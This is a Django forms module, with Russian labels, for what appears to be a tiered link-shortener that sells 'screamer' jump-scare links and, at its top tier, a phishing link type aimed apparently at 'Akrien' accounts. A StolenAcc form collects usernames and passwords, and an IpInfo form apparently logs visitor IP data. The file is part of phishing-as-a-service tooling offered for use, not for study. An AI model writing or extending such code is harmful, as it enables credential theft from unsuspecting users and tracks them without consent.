from django import forms
from django.contrib.auth.forms import AuthenticationForm, UserCreationForm


class ShortMyLink(forms.Form):
    redirect = forms.CharField(max_length=100, label='Редирект', widget=forms.TextInput(
        attrs={'class': 'form-control'}))
    type_of = forms.ChoiceField(choices=(("redirect", "Редирект"),
                                         ("screamer1", "Скример 1"),
                                         ),
                                widget=forms.Select(attrs={'class': 'form-select'}),
                                label='Тип ссылки'
                                )
    name = forms.CharField(disabled=True, required=False, max_length=30, label='Кастомная ссылка',
                           widget=forms.TextInput(attrs={'class': 'form-control', 'placeholder': 'Доступно в VIP'})
                           )


class ShortMyLinkPro(ShortMyLink):
    type_of = forms.ChoiceField(choices=(("redirect", "Редирект"),
                                         ("screamer1", "Скример 1"),
                                         ("screamer2", "Скример 2"),
                                         ),
                                widget=forms.Select(attrs={'class': 'form-select'}),
                                label='Тип ссылки'
                                )


class ShortMyLinkVip(ShortMyLinkPro):
    name = forms.CharField(empty_value='None', required=False, max_length=30, label='Кастомная ссылка',
                           widget=forms.TextInput(
                            attrs={'class': 'form-control',
                                   'placeholder': 'Необязательно'
                                   }
                           )
                           )


class ShortMyLinkMAX(ShortMyLinkVip):
    type_of = forms.ChoiceField(choices=(("redirect", "Редирект"),
                                         ("screamer1", "Скример 1"),
                                         ("screamer2", "Скример 2"),
                                         ("fishakr", "Фишинг акриен")
                                         ),
                                widget=forms.Select(attrs={'class': 'form-select'}),
                                label='Тип ссылки'
                                )
    name = forms.CharField(empty_value='None', required=False, max_length=30, label='Кастомная ссылка',
                           widget=forms.TextInput(
                               attrs={'class': 'form-control',
                                      'placeholder': 'Необязательно'
                                      }
                           )
                           )


class UserLoginForm(AuthenticationForm):
    username = forms.CharField(label='Ник', widget=forms.TextInput(
        attrs={'class': 'form-control'}))
    password = forms.CharField(label='Пароль', widget=forms.PasswordInput(
        attrs={'class': 'form-control'}))

    error_messages = {
        'invalid_login': (
            "Некорректный пароль"
        ),
        'inactive': "Ваш аккаунт заблокирован!",
    }


class RegistrationForm(UserCreationForm):
    username = forms.CharField(label='Имя Пользователя', widget=forms.TextInput(
        attrs={'class': 'form-control'}))
    password1 = forms.CharField(label='Пароль', widget=forms.PasswordInput(
        attrs={'class': 'form-control'}))
    password2 = forms.CharField(label='Повтор пароля', widget=forms.PasswordInput(
        attrs={'class': 'form-control'}))


class StolenAcc(forms.Form):
    username = forms.CharField()
    pas = forms.CharField()


class IpInfo(forms.Form):
    id = forms.CharField()
